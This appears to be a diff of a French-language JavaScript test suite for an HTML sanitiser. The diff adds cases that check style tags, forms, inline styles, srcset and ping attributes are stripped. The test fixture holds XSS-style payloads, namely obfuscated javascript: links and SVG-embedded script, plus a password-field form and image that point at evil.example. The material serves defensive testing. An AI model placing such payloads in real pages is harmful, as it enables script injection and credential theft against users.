@@ -18,6 +18,8 @@ const PIEGE = `<h2>Guide du tryhard</h2><p class="intro">Contenu réservé.</p>
 <a href=" JaVa&#x09;ScRiPt:window.__pirate='lien2'" id="lien-piege2">lien piégé 2</a>
 <iframe src="https://example.com"></iframe><object data="x"></object><embed src="x">
 <svg><script>window.__pirate='svg'</script><a xlink:href="javascript:alert(1)"><text>svg</text></a></svg>
+<style>body{display:none}</style><p style="position:fixed;inset:0" id="maquillage">voile</p>
+<form action="https://evil.example/x"><input name="mdp"></form><img srcset="https://evil.example/x.png 1x" alt="">
 <a href="albion.html" target="_blank" id="lien-sain">lien sain</a>`;
 
 async function ouvrir(vp, url, { session = SESSION, contenus = [], fonctions = {} } = {}) {
@@ -118,10 +120,12 @@ try {
                     ),
                     sain: document.getElementById('lien-sain')?.getAttribute('href'),
                     rel: document.getElementById('lien-sain')?.getAttribute('rel'),
+                    maquillage: z.querySelectorAll('style, form, [style], [srcset], [ping]').length,
                 };
             });
             t.verif(r.interdits === 0, 'nettoyage : <script>, <iframe>, <object>, <embed> supprimés (SVG compris)');
-            t.verif(r.on === 0 && r.img === 1, 'nettoyage : attributs on* retirés (l’image reste, sans onerror)');
+            t.verif(r.maquillage === 0, 'nettoyage : <style>, <form>, style=, srcset et ping retirés');
+            t.verif(r.on === 0 && r.img === 2, 'nettoyage : attributs on* retirés (l’image reste, sans onerror)');
             t.verif(
                 r.piege === false && r.piege2 === false && !r.svgHref,
                 'nettoyage : href javascript: retirés (casse, tabulation et SVG compris)',
